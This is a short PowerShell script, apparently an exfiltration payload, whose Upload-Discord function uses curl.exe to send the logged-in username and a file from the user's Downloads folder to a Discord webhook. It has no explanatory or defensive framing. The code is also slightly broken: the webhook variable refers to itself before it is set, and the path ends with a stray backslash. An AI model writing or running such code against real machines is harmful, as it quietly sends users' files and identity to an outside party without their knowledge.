$path = "$env:USERPROFILE\Downloads\test.txt\"

function Upload-Discord {
$wh = "https://discord.com/api/webhooks/$wh"
curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"$env:username\`"}" -F "file=@\`"$path`"" $wh
}

Upload-Discord
